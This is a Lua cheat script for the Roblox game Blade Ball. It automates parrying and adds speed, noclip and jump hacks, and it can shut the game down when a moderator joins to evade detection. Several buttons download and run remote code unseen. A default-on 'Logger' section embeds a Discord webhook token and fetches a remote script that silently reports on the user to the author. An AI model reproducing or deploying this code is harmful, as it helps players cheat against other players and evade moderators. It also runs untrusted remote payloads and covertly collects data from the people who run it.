--// Urbanstorm was here. 
-- Services & Initial Setup
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local keyCheck = LocalPlayer:FindFirstChild("Project Stark Key Check")
local skipLogger = false

-- Load UI Library
local Lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/UiLib.lua"))()
local win = Lib:Window("Project Stark\nᴮˡᵃᵈᵉ ᴮᵃˡˡ", Color3.fromRGB(120, 81, 169))

-- Create tabs
local combatTab = win:Tab("Combat")
local visualTab = win:Tab("Visual")
local movementTab = win:Tab("Movement")
local securityTab = win:Tab("Security")
local Extra = win:Tab("Extras")
local Credits = win:Tab("Credits")

-- Optimized Service Access
local clonefunction = clonefunction or function(f) return f end
local cloneref = clonefunction(cloneref) or function(i) return i end

local Services = setmetatable({}, {
	__index = function(self, serviceName)
		local service = cloneref(game:GetService(serviceName))
		self[serviceName] = service
		return service
	end,
})

-- Cached Services
local workspace = Services.Workspace
local ReplicatedStorage = Services.ReplicatedStorage
local UserInputService = Services.UserInputService
local VirtualInputManager = Services.VirtualInputManager
local RunService = Services.RunService
local TweenService = Services.TweenService
local Debris = Services.Debris
local GameStats = Services.Stats
local VUser = Services.VirtualUser

-- Settings
local Settings = {
	ParryMode = "Nothing",
	AutoParry = false,
	DetectCurvedShots = false,
	AutoSpam = false,
	MaxHits = 1,
	ModDetection = false,
	CurveShots = false,
	WalkToBall = false,
	WalkDistance = 17,
}

-- Constants
local ParryDuration = 0.548
local HitDelayCheck = 0.8
local MinRange = 2.583

-- Match State
local Match = {
	ball = {
		ball_itself = nil,
		client_ball_itself = nil,
		properties = {
			last_sphere_location = Vector3.zero,
			aero_dynamic_time = tick(),
			hell_hook_completed = true,
			last_position = Vector3.zero,
			rotation = Vector3.zero,
			position = Vector3.zero,
			last_warping = tick(),
			parry_remote = nil,
			is_curved = false,
			last_tick = tick(),
			auto_spam = false,
			cooldown = false,
			respawn_time = 0,
			parry_range = 0,
			spam_range = 0,
			maximum_speed = 0,
			old_speed = 0,
			parries = 0,
			direction = 0,
			distance = 0,
			velocity = Vector3.zero,
			last_hit = 0,
			lerp_radians = 0,
			radians = 0,
			speed = 0,
			dot = 0,
		},
	},
	target = {
		current = nil,
		from = nil,
		aim = nil,
	},
	entity_properties = {
		server_position = Vector3.zero,
		velocity = Vector3.zero,
		is_moving = false,
		direction = 0,
		distance = 0,
		speed = 0,
		dot = 0,
	},
}

local Playuh = {
	Entity = {
		properties = {
			sword = "",
			server_position = Vector3.zero,
			velocity = Vector3.zero,
			position = Vector3.zero,
			is_moving = false,
			speed = 0,
			ping = 0,
		},
	},
	properties = {
		grab_animation = nil,
	},
}

-- Utility Functions
local function LerpRadians(from, to, alpha)
	return from + ((to - from) * alpha)
end

local function GetPointer()
	local mouseLocation = UserInputService:GetMouseLocation()
	local screenRay = workspace.CurrentCamera:ScreenPointToRay(mouseLocation.X, mouseLocation.Y, 0)
	return CFrame.lookAt(screenRay.Origin, screenRay.Origin + screenRay.Direction)
end

-- Ball Functions
function Match.get_ball()
	for _, v in workspace.Balls:GetChildren() do
		if v:GetAttribute("realBall") then
			return v
		end
	end
end

function Match.get_client_ball()
	for _, v in workspace.Balls:GetChildren() do
		if not v:GetAttribute("realBall") then
			return v
		end
	end
end

-- Parry Remote Setup
function Match.get_parry_remote()
	local services = {Services.AnimationFromVideoCreatorService, Services.AdService}
	for _, service in services do
		local remoteEvent = service:FindFirstChildOfClass("RemoteEvent")
		if remoteEvent and remoteEvent.Name:find("\n") then
			Match.ball.properties.parry_remote = remoteEvent
			return
		end
	end
end

Match.get_parry_remote()

-- Player Aim Functions
function Playuh.get_aim_entity()
	local closestEntity, highestDot = nil, -math.huge
	local cameraLook = workspace.CurrentCamera.CFrame.LookVector

	for _, playerModel in workspace.Alive:GetChildren() do
		if playerModel and playerModel.Name ~= LocalPlayer.Name then
			local hrp = playerModel:FindFirstChild("HumanoidRootPart")
			if hrp then
				local direction = (hrp.Position - workspace.CurrentCamera.CFrame.Position).Unit
				local dot = cameraLook:Dot(direction)
				if dot > highestDot then
					highestDot = dot
					closestEntity = playerModel
				end
			end
		end
	end
	return closestEntity
end

function Playuh.get_closest_player_to_cursor()
	local closestPlayer, highestDot = nil, -math.huge
	local pointer = GetPointer()

	for _, playerModel in workspace.Alive:GetChildren() do
		if playerModel ~= LocalPlayer.Character and playerModel.Parent == workspace.Alive then
			local direction = (playerModel.PrimaryPart.Position - workspace.CurrentCamera.CFrame.Position).Unit
			local dot = pointer.LookVector:Dot(direction)
			if dot > highestDot then
				highestDot = dot
				closestPlayer = playerModel
			end
		end
	end
	return closestPlayer
end

-- Optimized Curve Shots (Removed Repetition)
local CurveConfigs = {
	Straight = function(targetPos)
		return CFrame.new(LocalPlayer.Character.PrimaryPart.Position, targetPos)
	end,
	Backwards = function()
		local cam = workspace.CurrentCamera
		return CFrame.new(cam.CFrame.Position, cam.CFrame.Position + (-cam.CFrame.LookVector * 10000) + Vector3.new(0, 1000, 0))
	end,
	Randomizer = function()
		return CFrame.new(
			LocalPlayer.Character.PrimaryPart.Position,
			Vector3.new(math.random(-1000, 1000), math.random(-350, 1000), math.random(-1000, 1000))
		)
	end,
	Boost = function(targetPos)
		return CFrame.new(LocalPlayer.Character.PrimaryPart.Position, targetPos + Vector3.new(0, 150, 0))
	end,
	High = function(targetPos)
		return CFrame.new(LocalPlayer.Character.PrimaryPart.Position, targetPos + Vector3.new(0, 1000, 0))
	end,
	CurveBalls = function(targetPos)
		return CFrame.new(LocalPlayer.Character.PrimaryPart.Position, targetPos + Vector3.new(0, 500, 0))
	end,
}

-- Grab Animation
function Match.perform_grab_animation()
	local equippedSword = Playuh.Entity.properties.sword
	if not equippedSword or equippedSword == "Titan Blade" then return end

	local grabParryAnim = ReplicatedStorage.Shared.SwordAPI.Collection.Default:FindFirstChild("GrabParry")
	if not grabParryAnim then return end

	local swordData = ReplicatedStorage.Shared.ReplicatedInstances.Swords.GetSword:Invoke(equippedSword)
	if not swordData or not swordData.AnimationType then return end

	local playerChar = LocalPlayer.Character
	if not playerChar or not playerChar:FindFirstChild("Humanoid") then return end

	local swordModel = ReplicatedStorage.Shared.SwordAPI.Collection:FindFirstChild(swordData.AnimationType)
	if swordModel then
		local anim = swordModel:FindFirstChild("GrabParry") or swordModel:FindFirstChild("Grab")
		if anim then
			grabParryAnim = anim
			if anim.Name == "Grab" then
				VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0.001)
			end
		end
	end

	Playuh.properties.grab_animation = playerChar.Humanoid:LoadAnimation(grabParryAnim)
	Playuh.properties.grab_animation:Play()
	VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0.001)
end

-- Optimized Perform Parry
function Match.perform_parry()
	local props = Match.ball.properties
	if props.cooldown and not props.auto_spam then return end

	props.parries = props.parries + 1
	props.last_hit = tick()

	if not props.auto_spam then
		Match.perform_grab_animation()
		props.cooldown = true

		if Settings.CurveShots then
			local curveOptions = {"Straight", "CurveBalls", "Boost", "High", "Backwards"}
			local curveType = curveOptions[math.random(#curveOptions)]
			local cameraCFrame = CurveConfigs[curveType](Match.entity_properties.server_position)
			
			local originalCFrame = workspace.CurrentCamera.CFrame
			task.spawn(function()
				TweenService:Create(
					workspace.CurrentCamera,
					TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
					{CFrame = cameraCFrame}
				):Play()
				
				task.wait(0.2)
				repeat task.wait() until Playuh.properties.grab_animation
				Playuh.properties.grab_animation.Ended:Wait()
				
				TweenService:Create(
					workspace.CurrentCamera,
					TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
					{CFrame = originalCFrame}
				):Play()
			end)
		end
	end

	VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0.001)

	task.delay(HitDelayCheck, function()
		if props.parries > 0 then
			props.parries = props.parries - 1
		end
	end)
end

-- Reset Function
function Match.reset()
	local props = Match.ball.properties
	props.is_curved = false
	props.auto_spam = false
	props.cooldown = false
	props.maximum_speed = 0
	props.parries = 0
	Match.entity_properties.server_position = Vector3.zero
	Match.target.current = nil
	Match.target.from = nil
end

-- Curve Detection
function Match.is_curved()
	local target = Match.target.current
	if not target then return false end

	local props = Match.ball.properties
	local targetName = target.Name

	-- Early returns for specific conditions
	if target.PrimaryPart:FindFirstChild("MaxShield") and targetName ~= LocalPlayer.Name and props.distance < 50 then
		return false
	end

	if Match.ball.ball_itself:FindFirstChild("TimeHole1") and targetName ~= LocalPlayer.Name and props.distance < 100 then
		props.auto_spam = false
		return false
	end

	if Match.ball.ball_itself:FindFirstChild("WEMAZOOKIEGO") and targetName ~= LocalPlayer.Name and props.distance < 100 then
		return false
	end

	if Match.ball.ball_itself:FindFirstChild("At2") and props.speed <= 0 then
		return true
	end

	-- Aerodynamic check
	local aeroVFX = Match.ball.ball_itself:FindFirstChild("AeroDynamicSlashVFX")
	if aeroVFX then
		Debris:AddItem(aeroVFX, 0)
		props.auto_spam = false
		props.aero_dynamic_time = tick()
	end

	local tornado = workspace.Runtime:FindFirstChild("Tornado")
	if tornado and props.distance > 5 then
		local tornadoTime = tornado:GetAttribute("TornadoTime") or 1
		if (tick() - props.aero_dynamic_time) < (tornadoTime + 0.314159) then
			return true
		end
	end

	if not props.hell_hook_completed and targetName == LocalPlayer.Name and props.distance > (5 - math.random()) then
		return true
	end

	-- Curve prediction
	local predictedPos = props.position + (props.velocity * (props.distance / props.maximum_speed))
	local lastCurvePos = props.last_curve_position or props.position
	local dirChange = (predictedPos - lastCurvePos).Unit
	local velDirection = props.velocity.Unit:Dot(dirChange)
	local angleDelta = math.acos(math.clamp(velDirection, -1, 1))
	
	local speedFactor = math.min(props.speed / 100, 40)
	local dotFactor = 40.046 * math.max(props.dot, 0)
	local ping = Playuh.Entity.properties.ping
	local travelTime = (props.distance / (props.velocity.Magnitude + 0.01)) - (ping / 1000)
	
	local curveThreshold = (15 - math.min(props.distance / 1000, 15)) + dotFactor + speedFactor
	
	if props.maximum_speed > 100 and travelTime > (ping / 10) then
		curveThreshold = math.max(curveThreshold - 15, 15)
	end

	if props.distance < curveThreshold then return false end
	
	if angleDelta > (0.5 + (props.speed / 310)) then
		props.auto_spam = false
		return true
	end

	if props.lerp_radians < 0.018 then
		props.last_curve_position = props.position
		props.last_warping = tick()
	end

	if (tick() - props.last_warping) < (travelTime / 1.5) then
		return true
	end

	props.last_curve_position = props.position
	return props.dot < (ParryDuration - (ping / 950))
end

-- Spam Detection
local lastTargetFrom
function Match.is_spam(ballState)
	if not Settings.AutoSpam or not Match.target.current then return false end

	if Match.target.from ~= LocalPlayer.Character then
		lastTargetFrom = Match.target.from
	end

	if ballState.parries < (3 - 1) and Match.target.from == lastTargetFrom then
		return false
	end

	local ping = Playuh.Entity.properties.ping
	local spamThreshold = (ballState.spam_accuracy / 3.5) + (ping / 80)
	local props = Match.ball.properties
	local travelTime = (props.distance / props.maximum_speed) - (ping / 1000)

	-- Series of checks
	if (tick() - ballState.last_hit) > 0.8 and ballState.entity_distance > spamThreshold and ballState.parries < 3 then
		ballState.parries = 1
		return false
	end

	if props.lerp_radians > 0.028 then
		if ballState.parries < 2 then ballState.parries = 1 end
		return false
	end

	if (tick() - props.last_warping) < (travelTime / 1.3) and ballState.entity_distance > spamThreshold and ballState.parries < 4 then
		if ballState.parries < 3 then ballState.parries = 1 end
		return false
	end

	if math.abs(ballState.speed - ballState.old_speed) < 5.2 and ballState.entity_distance > spamThreshold and ballState.speed < 60 and ballState.parries < 3 then
		if ballState.parries < 3 then ballState.parries = 0 end
		return false
	end

	if ballState.speed < 10 then
		ballState.parries = 1
		return false
	end

	if ballState.maximum_speed < ballState.speed and ballState.entity_distance > spamThreshold then
		ballState.parries = 1
		return false
	end

	if ballState.entity_distance > ballState.range and ballState.entity_distance > spamThreshold then
		if ballState.parries < 2 then ballState.parries = 1 end
		return false
	end

	if ballState.ball_distance > ballState.range and ballState.entity_distance > spamThreshold then
		if ballState.parries < 2 then ballState.parries = 2 end
		return false
	end

	if ballState.last_position_distance > ballState.spam_accuracy and ballState.entity_distance > spamThreshold then
		if ballState.parries < 4 then ballState.parries = 2 end
		return false
	end

	if ballState.ball_distance > ballState.spam_accuracy and ballState.ball_distance > spamThreshold then
		if ballState.parries < 3 then ballState.parries = 2 end
		return false
	end

	if ballState.entity_distance > ballState.spam_accuracy and ballState.entity_distance > (spamThreshold - math.pi) then
		if ballState.parries < 3 then ballState.parries = 2 end
		return false
	end

	return true
end

-- Server Position Simulation
RunService:BindToRenderStep("server position simulation", 1, function()
	local char = LocalPlayer.Character
	if char and char.PrimaryPart then
		task.delay(GameStats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000, function()
			if char and char.PrimaryPart then
				Playuh.Entity.properties.server_position = char.PrimaryPart.Position
			end
		end)
	end
end)

-- Player Properties Update
Services.NetworkClient:SetOutgoingKBPSLimit(math.huge)
RunService.PreSimulation:Connect(function()
	local char = LocalPlayer.Character
	if not char or not char.PrimaryPart then return end

	local props = Playuh.Entity.properties
	props.sword = char:GetAttribute("CurrentlyEquippedSword")
	props.ping = GameStats.Network.ServerStatsItem["Data Ping"]:GetValue()
	props.velocity = char.PrimaryPart.AssemblyLinearVelocity
	props.speed = props.velocity.Magnitude
	props.is_moving = props.speed > 30
end)

-- Ball Properties Update
Match.ball.ball_itself = Match.get_ball()
Match.ball.client_ball_itself = Match.get_client_ball()

RunService.PreSimulation:Connect(function()
	local ballEntity = Match.ball.ball_itself
	if not ballEntity then return end

	local props = Match.ball.properties
	props.position = ballEntity.Position
	props.velocity = ballEntity.AssemblyLinearVelocity

	local zoomies = ballEntity:FindFirstChild("zoomies")
	if zoomies then
		props.velocity = zoomies.VectorVelocity
	end

	props.distance = (Playuh.Entity.properties.server_position - props.position).Magnitude
	props.speed = props.velocity.Magnitude
	props.direction = (Playuh.Entity.properties.server_position - props.position).Unit
	props.dot = props.direction:Dot(props.velocity.Unit)
	props.radians = math.rad(math.asin(props.dot))
	props.lerp_radians = LerpRadians(props.lerp_radians, props.radians, 0.8)

	if props.lerp_radians ~= props.lerp_radians then -- NaN check
		props.lerp_radians = 0.027
	end

	props.maximum_speed = math.max(props.speed, props.maximum_speed)

	Match.target.aim = (not UserInputService.TouchEnabled and Playuh.get_closest_player_to_cursor()) or Playuh.get_aim_entity()

	local targetAttr = ballEntity:GetAttribute("target")
	if targetAttr then
		Match.target.current = workspace.Alive:FindFirstChild(targetAttr)
	end

	local fromAttr = ballEntity:GetAttribute("from")
	if fromAttr then
		Match.target.from = workspace.Alive:FindFirstChild(fromAttr)
	end

	if Match.target.current and Match.target.current.Name == LocalPlayer.Name then
		props.rotation = Match.target.aim.PrimaryPart.Position
		return
	end

	if not Match.target.current then return end

	local targetPos = Match.target.current.PrimaryPart.Position
	local targetVel = Match.target.current.PrimaryPart.AssemblyLinearVelocity

	local entityProps = Match.entity_properties
	entityProps.server_position = targetPos
	entityProps.velocity = targetVel
	entityProps.distance = LocalPlayer:DistanceFromCharacter(targetPos)
	entityProps.direction = (Playuh.Entity.properties.server_position - targetPos).Unit
	entityProps.speed = targetVel.Magnitude
	entityProps.is_moving = targetVel.Magnitude > 0.1
	entityProps.dot = entityProps.is_moving and math.max(entityProps.direction:Dot(targetVel.Unit), 0) or 0
end)

-- Hell Hook Events
ReplicatedStorage.Remotes.PlrHellHooked.OnClientEvent:Connect(function(recall)
	Match.ball.properties.hell_hook_completed = recall.Name ~= LocalPlayer.Name
end)

ReplicatedStorage.Remotes.PlrHellHookCompleted.OnClientEvent:Connect(function()
	Match.ball.properties.hell_hook_completed = true
end)

-- Anti-AFK
LocalPlayer.Idled:Connect(function()
	VUser:CaptureController()
	VUser:ClickButton2(Vector2.zero)
end)

-- Mod Detection
local ModRoles = {"content creator", "contributor", "trial qa", "tester", "mod"}
Players.PlayerAdded:Connect(function(player)
	if not Settings.ModDetection then return end
	local role = tostring(player:GetRoleInGroup(12836673)):lower()
	if table.find(ModRoles, role) then
		game:Shutdown()
	end
end)

-- Ball Events
local isBallOnGame = false
workspace.Balls.ChildRemoved:Connect(function(v)
	isBallOnGame = false
	if v == Match.ball.ball_itself then
		Match.ball.ball_itself = nil
		Match.ball.client_ball_itself = nil
		Match.reset()
	end
end)

workspace.Balls.ChildAdded:Connect(function()
	if isBallOnGame then return end
	isBallOnGame = true
	
	local props = Match.ball.properties
	props.respawn_time = tick()
	Match.ball.ball_itself = Match.get_ball()
	Match.ball.client_ball_itself = Match.get_client_ball()
	
	Match.ball.ball_itself:GetAttributeChangedSignal("target"):Connect(function()
		local target = Match.ball.ball_itself:GetAttribute("target")
		if target == LocalPlayer.Name then
			props.cooldown = false
			return
		end
		props.cooldown = false
		props.old_speed = props.speed
		props.last_position = props.position
		props.parries = props.parries + 1
		task.delay(1, function()
			if props.parries > 0 then
				props.parries = props.parries - 1
			end
		end)
	end)
end)

-- Auto Spam Handler
RunService.PreSimulation:Connect(function()
	if not Match.ball.properties.auto_spam then return end
	task.spawn(function()
		for _ = 1, Settings.MaxHits do
			Match.perform_parry()
		end
	end)
end)

-- Parry Events
ReplicatedStorage.Remotes.ParrySuccessAll.OnClientEvent:Connect(function(ball, hitEntity)
	if hitEntity.Parent and hitEntity.Parent ~= LocalPlayer.Character then
		if hitEntity.Parent.Parent ~= workspace.Alive then return end
		Match.ball.properties.cooldown = false
	end

	if Match.ball.properties.auto_spam then
		for _ = 1, Settings.MaxHits do
			Match.perform_parry()
		end
	end
end)

ReplicatedStorage.Remotes.ParrySuccess.OnClientEvent:Connect(function()
	if LocalPlayer.Character.Parent ~= workspace.Alive then return end
	if not Playuh.properties.grab_animation then return end

	Playuh.properties.grab_animation:Stop()

	if Match.ball.properties.auto_spam then
		for _ = 1, Settings.MaxHits do
			Match.perform_parry()
		end
	end
end)

-- Walk to Ball
local walkConnection
local function WalkBall()
	local char = LocalPlayer.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Humanoid") then
		return
	end

	if walkConnection then
		walkConnection:Disconnect()
	end

	local humanoid = char.Humanoid
	local rootPart = char.HumanoidRootPart

	walkConnection = RunService.Heartbeat:Connect(function()
		if not Settings.WalkToBall then
			humanoid:Move(Vector3.zero)
			walkConnection:Disconnect()
			return
		end

		local ball = Match.get_ball()
		if not ball then
			humanoid:Move(Vector3.zero)
			return
		end

		local distance = (ball.Position - rootPart.Position).Magnitude
		if distance <= Settings.WalkDistance then
			humanoid:Move(Vector3.zero)
			return
		end

		local direction = (ball.Position - rootPart.Position).Unit
		humanoid:MoveTo(rootPart.Position + direction * math.min(distance - Settings.WalkDistance, humanoid.WalkSpeed * 0.1))
	end)
end

task.spawn(function()
	while task.wait(5) do
		WalkBall()
	end
end)

-- Auto Parry Logic
task.spawn(function()
	RunService.PostSimulation:Connect(function()
		if not Settings.AutoParry then
			Match.reset()
			return
		end

		local char = LocalPlayer.Character
		if not char or char.Parent == workspace.Dead then
			Match.reset()
			return
		end

		if not Match.ball.ball_itself then return end

		local props = Match.ball.properties
		props.is_curved = Match.is_curved()

		local ping = Playuh.Entity.properties.ping
		local baseAccuracy = 0.51
		local distanceFactor = baseAccuracy * (1 / (Match.entity_properties.distance + 0.01)) * 1000
		local pingFactor = math.clamp(ping / 10, 10, 16)
		local spamAccuracy = math.min(distanceFactor + (props.speed / 8.4), 50 + distanceFactor) + pingFactor
		local parryBaseRange = (props.maximum_speed / 11.7) + pingFactor

		if Playuh.Entity.properties.is_moving then
			parryBaseRange = parryBaseRange * 0.8
		end

		if ping >= 190 then
			parryBaseRange = parryBaseRange * (1 + (ping / 1000))
		end

		props.spam_range = pingFactor + math.min(distanceFactor + (props.speed / 2.3), 50 + distanceFactor)
		props.parry_range = ((parryBaseRange * 1.16) + pingFactor + props.speed) / MinRange

		if Playuh.Entity.properties.sword == "Titan Blade" then
			props.parry_range = props.parry_range + 11
			props.spam_range = props.spam_range + 2
		end

		local lastPosDistance = LocalPlayer:DistanceFromCharacter(props.last_position)

		if props.auto_spam and Match.target.current then
			props.auto_spam = Match.is_spam({
				speed = props.speed,
				spam_accuracy = spamAccuracy,
				parries = props.parries,
				ball_speed = props.speed,
				range = props.spam_range / (3.15 - (pingFactor / 10)),
				last_hit = props.last_hit,
				ball_distance = props.distance,
				maximum_speed = props.maximum_speed,
				old_speed = props.old_speed,
				entity_distance = Match.entity_properties.distance,
				last_position_distance = lastPosDistance,
			})
		end

		if props.auto_spam then return end

		if Match.target.current and Match.target.current.Name == LocalPlayer.Name then
			props.auto_spam = Match.is_spam({
				speed = props.speed,
				spam_accuracy = spamAccuracy,
				parries = props.parries,
				ball_speed = props.speed,
				range = props.spam_range,
				last_hit = props.last_hit,
				ball_distance = props.distance,
				maximum_speed = props.maximum_speed,
				old_speed = props.old_speed,
				entity_distance = Match.entity_properties.distance,
				last_position_distance = lastPosDistance,
			})
		end

		if props.is_curved then return end

		if props.distance > props.parry_range 
			and props.distance > parryBaseRange 
			and props.distance > (props.parry_range * (1 + (ping / 1000)))
			and props.distance > (parryBaseRange * (1 + (ping / 1000))) then
			return
		end

		if Match.target.current and Match.target.current ~= LocalPlayer.Character then
			return
		end

		if Settings.ParryMode == "Legit" then
			if props.distance <= 10 and Match.entity_properties.distance <= 50 then
				if math.random(1, 2) == 1 then
					Match.perform_parry()
				end
			end
			if props.maximum_speed >= 250 then
				parryBaseRange = parryBaseRange * 1.2
			end
		end

		props.last_sphere_location = props.position
		Match.perform_parry()

		task.spawn(function()
			repeat
				RunService.PreSimulation:Wait()
			until (tick() - props.last_hit) > (1 - (pingFactor / 100))
			props.cooldown = false
		end)
	end)
end)

-- UI Configuration
combatTab:Toggle("Auto Parry", function(value)
	Settings.AutoParry = value
end)

combatTab:Dropdown("Parry Mode", {"Nothing", "Legit", "Machine"}, function(selected)
	Settings.ParryMode = selected
end)

combatTab:Toggle("Auto Spam", function(value)
	Settings.AutoSpam = value
end)

combatTab:Slider("Max Hits", 1, 10, Settings.MaxHits, function(value)
	Settings.MaxHits = value
end)

visualTab:Toggle("Detect Curved Shots", function(value)
	Settings.DetectCurvedShots = value
end)

visualTab:Toggle("Enable Curve Shots", function(value)
	Settings.CurveShots = value
end)

visualTab:Label("Curve shots will aim at different angles")
visualTab:Label("Press L to open a normal sword crate")

movementTab:Toggle("Walk To Ball", function(value)
	Settings.WalkToBall = value
	if value then WalkBall() end
end)

movementTab:Slider("Stop Distance", 5, 50, Settings.WalkDistance, function(value)
	Settings.WalkDistance = value
end)

movementTab:Label("Distance from ball to stop walking")
movementTab:Label("Lower = Get closer to ball")
movementTab:Label("Higher = Stop further from ball")

securityTab:Toggle("Mod Detection", function(value)
	Settings.ModDetection = value
end)

securityTab:Label("Shutdown if moderator joins")
securityTab:Label("⚠️ Use with caution")

-- Extras Tab
Extra:Button("Admin", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

Extra:Button("FPS Boost", function()
	local Lighting = game:GetService("Lighting")
	local Terrain = workspace:FindFirstChildWhichIsA("Terrain")

	if Terrain then
		Terrain.WaterWaveSize = 0
		Terrain.WaterWaveSpeed = 0
		Terrain.WaterReflectance = 0
		Terrain.WaterTransparency = 1
	end

	Lighting.GlobalShadows = false
	Lighting.FogEnd = 9e9
	Lighting.FogStart = 9e9
	settings().Rendering.QualityLevel = Enum.QualityLevel.Level01

	for _, v in game:GetDescendants() do
		if v:IsA("BasePart") then
			v.CastShadow = false
			v.Material = Enum.Material.Plastic
			v.Reflectance = 0
		elseif v:IsA("Decal") then
			v.Transparency = 1
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
			v.Lifetime = NumberRange.new(0)
		elseif v:IsA("PostEffect") then
			v.Enabled = false
		end
	end

	workspace.DescendantAdded:Connect(function(child)
		if child:IsA("ForceField") or child:IsA("Sparkles") or child:IsA("Smoke") or child:IsA("Fire") then
			task.wait()
			child:Destroy()
		elseif child:IsA("BasePart") then
			child.CastShadow = false
		end
	end)
end)

Extra:Button("Server Hop", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/nfYuXYqd"))()
end)

Extra:Button("Anti-Afk - Already Running", function() end)

local InfJump, InfJumpStarted = false
Extra:Toggle("Infinite Jump", function(value)
	InfJump = value
	if not InfJumpStarted then
		InfJumpStarted = true
		UserInputService.InputBegan:Connect(function(input)
			if InfJump and input.KeyCode == Enum.KeyCode.Space then
				local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
				if humanoid then
					humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				end
			end
		end)
	end
end)

local PlrSpeed = 40
Extra:Slider("Player Speed", 20, 200, 23, function(value)
	PlrSpeed = value
	if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
		LocalPlayer.Character.Humanoid.WalkSpeed = PlrSpeed
	end
end)

-- Speed Monitor
task.spawn(function()
	while task.wait(0.5) do
		pcall(function()
			if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
				if LocalPlayer.Character.Humanoid.WalkSpeed ~= PlrSpeed then
					LocalPlayer.Character.Humanoid.WalkSpeed = PlrSpeed
				end
			end
		end)
	end
end)

-- Credits
Credits:Button("Made by Urbanstorm", function()
	setclipboard("Urbanstorm")
end)

Credits:Button("https://discord.gg/vgYZApyrZC - Click to copy", function()
	setclipboard("https://discord.gg/vgYZApyrZC")
end)

-- Camera & Noclip Fix
task.spawn(function()
	pcall(function()
		LocalPlayer.CameraMaxZoomDistance = 1000

		local PopperClient = LocalPlayer.PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper

		for _, v in getgc() do
			if typeof(v) == "function" and getfenv(v).script == PopperClient then
				for i, const in debug.getconstants(v) do
					if tonumber(const) == 0.25 then
						debug.setconstant(v, i, 0)
					elseif tonumber(const) == 0 then
						debug.setconstant(v, i, 0.25)
					end
				end
			end
		end

		for _, v in LocalPlayer.Character:GetChildren() do
			if v:IsA("BasePart") or v:IsA("MeshPart") then
				v.CanCollide = false
			end
		end
	end)
end)

-- Logger
if not skipLogger then
	task.spawn(function()
		pcall(function()
			getgenv().Webyhookie = "https://discord.com/api/webhooks/1430193577346207866/4rbO1dlJSV3vBnXt362154l9JV2jpPc70x-Sh2XVsG_u0v3O2WbV0X8snDdQyRsSdLrf" -- nuked already
			getgenv().Titlewebyhookie = "ᴮˡᵃᵈᵉ ᴮᵃˡˡ"
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Log.lua"))()
		end)
	end)
end

-- Sword Crate Opener
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed or input.KeyCode ~= Enum.KeyCode.L then return end
	
	local cratePrompt = workspace.Spawn 
		and workspace.Spawn.Crates
		and workspace.Spawn.Crates.NormalSwordCrate
		and workspace.Spawn.Crates.NormalSwordCrate.Lock
		and workspace.Spawn.Crates.NormalSwordCrate.Lock.ProximityPrompt

	if cratePrompt then
		fireproximityprompt(cratePrompt)
	end
end)
